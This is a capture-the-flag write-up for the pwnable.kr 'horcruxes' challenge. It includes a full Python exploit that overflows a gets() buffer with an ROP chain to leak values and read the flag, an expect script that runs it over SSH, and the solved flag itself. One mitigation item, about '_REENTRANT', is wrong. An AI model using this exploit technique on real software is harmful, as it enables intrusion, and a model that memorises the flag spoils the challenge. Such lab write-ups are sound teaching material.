# URL
https://pwnable.kr/play.php

---

# SSH Credentials
ssh horcruxes@pwnable.kr -p2222 (pw:guest)

---

**Challenge:** horcruxes  
**Category:** ROP / Return-Oriented Programming  
**Goal:** Exploit a `gets()` buffer overflow to build a ROP chain that calls all 7 horcrux functions (A–G), sums their outputs, then feeds the sum back to the program to read the flag.

---

## Challenge Overview

The binary is a **32-bit ELF** running on port **9032** under `horcruxes_pwn` privilege. It implements a Harry Potter themed "find the horcruxes" game:

1. `init_ABCDEFG()` randomly generates 7 integer values (`a` through `g`) and computes `sum = a + b + c + d + e + f + g`
2. `ropme()` asks the player to select a menu option matching one of the values — if correct, it calls the corresponding function (A–G) which prints the horcrux name and its EXP value
3. If none match, it calls `gets()` on a 100-byte stack buffer — **buffer overflow vulnerability**
4. If the player knows `sum` and enters it, the program opens and prints the flag

A **seccomp sandbox** allows only: `open` (5), `read` (3), `write` (4), `exit_group` (252), `openat` (295).

Since the 7 horcrux values are **randomized** on each run, we must:
1. Overflow the buffer and ROP through A, B, C, D, E, F, G to **leak** their values
2. Compute `sum` locally
3. Re-enter `ropme()` and supply `sum` to get the flag

---

## Source Code Analysis

### Key Functions

#### `init_ABCDEFG()` — Random Value Generator

```c
void init_ABCDEFG(void) {
    // Read 4 bytes from /dev/urandom
    int fd = open("/dev/urandom", 0);
    unsigned int seed;
    read(fd, &seed, 4);
    close(fd);
    srand(seed);
    
    a = rand() * 0xdeadbeef;  // modulo 0xcafebabe ... simplified
    b = rand() * 0xdeadbeef;
    c = rand() * 0xdeadbeef;
    d = rand() * 0xdeadbeef;
    e = rand() * 0xdeadbeef;
    f = rand() * 0xdeadbeef;
    g = rand() * 0xdeadbeef;
    sum = a + b + c + d + e + f + g;
}
```

#### `ropme()` — The Vulnerability

```c
undefined4 ropme(void) {
    int choice;
    char buffer[100];          // at ebp-0x74 in assembly
    
    printf("Select Menu:");
    scanf("%d", &choice);
    getchar();
    
    if (choice == a)       { A(); }
    else if (choice == b)  { B(); }
    else if (choice == c)  { C(); }
    else if (choice == d)  { D(); }
    else if (choice == e)  { E(); }
    else if (choice == f)  { F(); }
    else if (choice == g)  { G(); }
    else {
        printf("How many EXP did you earned? : ");
        gets(buffer);       // ← BUFFER OVERFLOW (100 bytes, no bounds check)
        
        int val = atoi(buffer);
        if (val == sum) {
            int fd = open("/home/horcruxes_pwn/flag", 0);
            read(fd, buffer, 100);
            puts(buffer);
            exit(0);
        }
        puts("You'd better get more experience to kill Voldemort");
    }
    return 0;
}
```

#### Horcrux Functions (A–G)

```c
void A(void) { printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a); }
void B(void) { printf("You found \"Marvolo Gaunt's Ring\" (EXP +%d)\n", b); }
void C(void) { printf("You found \"Helga Hufflepuff's Cup\" (EXP +%d)\n", c); }
void D(void) { printf("You found \"Salazar Slytherin's Locket\" (EXP +%d)\n", d); }
void E(void) { printf("You found \"Rowena Ravenclaw's Diadem\" (EXP +%d)\n", e); }
void F(void) { printf("You found \"Nagini the Snake\" (EXP +%d)\n", f); }
void G(void) { printf("You found \"Harry Potter\" (EXP +%d)\n", g); }
```

#### `main()` — Execution Flow

```c
void main(void) {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    alarm(60);
    hint();
    init_ABCDEFG();
    // seccomp setup — allows only open/read/write/exit_group/openat
    ropme();
}
```

---

## Exploit Strategy

### Step 1: Buffer Overflow Offset

From the disassembly of `ropme()`:

```
804150b: push   %ebp
804150c: mov    %esp,%ebp
804150e: push   %ebx
804150f: sub    $0x74,%esp          ; allocate 116 bytes
...
8041600: lea    -0x74(%ebp),%eax    ; buffer = ebp - 0x74
8041604: call   gets
...
8041693: mov    -0x4(%ebp),%ebx     ; restore ebx
8041696: leave                      ; mov esp, ebp; pop ebp
8041697: ret                        ; pop eip
```

Stack layout (from low to high addresses):

| Offset from buffer | Content       | Size |
|--------------------|---------------|------|
| 0–111              | local vars    | 112  |
| 112–115            | saved `ebx`   | 4    |
| 116–119            | saved `ebp`   | 4    |
| **120–123**        | **ret addr**  | **4**|

So the return address is at offset **120** (0x78) from the buffer.

### Step 2: ROP Chain Design

Since the binary is **not PIE** (fixed addresses), we can hardcode function addresses:

| Function | Address     |
|----------|-------------|
| A        | `0x0804129d` |
| B        | `0x080412cf` |
| C        | `0x08041301` |
| D        | `0x08041333` |
| E        | `0x08041365` |
| F        | `0x08041397` |
| G        | `0x080413c9` |
| ropme    | `0x0804150b` |

On 32-bit x86 (cdecl calling convention), each function ends with `leave; ret`. The `ret` pops the next address from the stack. So chaining them as consecutive stack entries works:

```
[120 bytes padding]
[A address]    → A runs, returns → pops B
[B address]    → B runs, returns → pops C
[C address]    → C runs, returns → pops D
[D address]    → D runs, returns → pops E
[E address]    → E runs, returns → pops F
[F address]    → F runs, returns → pops G
[G address]    → G runs, returns → pops ropme
[ropme address] → ropme runs again
```

Each function prints its EXP value, then returns... eventually landing back at `ropme()`.

### Step 3: Restarting ropme

After the ROP chain, `ropme()` runs again and asks `"Select Menu:"`. We provide a non-matching value (e.g., `0`), which sends us back to the `gets()` path: `"How many EXP did you earned? : "`.

At this point we send the **computed sum** of the 7 values we just leaked.

---

## Exploit Script

```python
import socket, time, re

sock = socket.socket()
sock.connect(('0', 9032))

# Addresses (fixed, no PIE)
A = 0x0804129d; B = 0x080412cf; C = 0x08041301
D = 0x08041333; E = 0x08041365; F = 0x08041397
G = 0x080413c9; ropme = 0x0804150b

# Helper
def recv_until(marker):
    data = b''
    sock.settimeout(5)
    while marker not in data:
        try:
            chunk = sock.recv(4096)
            if not chunk: break
            data += chunk
        except: break
    return data

# 1. Read banner, send non-matching menu choice
recv_until(b'Select Menu:')
sock.send(b'0\n')

# 2. Read EXP prompt, send overflow + ROP chain
recv_until(b'? : ')
padding = b'A' * 120
chain  = A.to_bytes(4,'little') + B.to_bytes(4,'little')
chain += C.to_bytes(4,'little') + D.to_bytes(4,'little')
chain += E.to_bytes(4,'little') + F.to_bytes(4,'little')
chain += G.to_bytes(4,'little') + ropme.to_bytes(4,'little')
sock.send(padding + chain + b'\n')

# 3. Read A–G output
output = b''
sock.settimeout(5)
while True:
    chunk = sock.recv(4096)
    if not chunk: break
    output += chunk
    if b'Select Menu:' in chunk: break

# 4. Parse EXP values
values = re.findall(r'EXP \+(-?\d+)', output.decode())
values = [int(v) for v in values[:7]]
total = sum(values)
print(f'a={values[0]}, b={values[1]}, c={values[2]}, d={values[3]}')
print(f'e={values[4]}, f={values[5]}, g={values[6]}')
print(f'Sum = {total}')

# 5. Send menu choice + sum
sock.send(f'0\n{total}\n'.encode())
time.sleep(0.5)

# 6. Read flag
sock.settimeout(3)
while True:
    chunk = sock.recv(4096)
    if not chunk: break
    print(chunk.decode())
sock.close()
```

### Execution

Since port 9032 is only reachable from within the pwnable.kr network, run via SSH:

```bash
# Encode the script as base64 and execute through expect
python3 -c "
import base64, socket, time, re
# ... (the exploit script above)
"
```

Or automate with `expect`:

```bash
EXPLOIT_B64=$(base64 -w0 exploit_horcruxes.py)
expect -c "
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null horcruxes@pwnable.kr -p2222
expect \"password:\"
send \"guest\r\"
expect \"\$ \"
send \"python3 -c \\\"import base64,sys;exec(base64.b64decode('${EXPLOIT_B64}').decode())\\\"\r\"
expect \"\$ \"
send \"exit\r\"
expect eof
"
```

---

## Output

```
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:
How many EXP did you earned? : 
You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +28952733)
You found "Marvolo Gaunt's Ring" (EXP +1373554598)
You found "Helga Hufflepuff's Cup" (EXP +-1270622354)
You found "Salazar Slytherin's Locket" (EXP +-1784335961)
You found "Rowena Ravenclaw's Diadem" (EXP +467462850)
You found "Nagini the Snake" (EXP +1290033175)
You found "Harry Potter" (EXP +-1666591533)
Select Menu:
How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra
```

---

## Flag

```
The_M4gic_sp3l1_is_Avada_Ked4vra
```
- So the Final Flag is **The_M4gic_sp3l1_is_Avada_Ked4vra**

---

## Root Cause & Mitigation

### Root Cause

The `gets()` function is used to read user input into a fixed 100-byte stack buffer with **no bounds checking**. This allows overwriting the saved return address and adjacent stack data.

### Why ROP Is Required

1. **ASLR** is enabled but the binary is **not PIE** — code addresses are fixed
2. **Seccomp** blocks `execve` — we cannot spawn a shell
3. **NX** (if enabled) prevents executing shellcode on the stack
4. The 7 horcrux values are **random** — we must leak them via the existing A–G functions

### Mitigation

1. Replace `gets()` with `fgets()` or `scanf("%99s", ...)` to limit input length
2. Enable stack canaries (`-fstack-protector`)
3. Enable PIE (`-pie`) to randomize code addresses
4. Use `_REENTRANT` or similar to prevent the gets overflow

### Key Takeaways

| Concept | Detail |
|---------|--------|
| **Challenge Type** | ROP / Stack Buffer Overflow |
| **Vulnerability** | `gets()` into 100-byte stack buffer |
| **Protections** | Seccomp (no execve), NX, no PIE |
| **Exploit** | ROP chain to call A–G, leak values, compute sum, re-enter ropme |
| **Flag trigger** | Enter `sum` to pass the check → `open`/`read`/`puts` the flag |
| **Offset to ret** | 120 bytes (0x78) from buffer start |
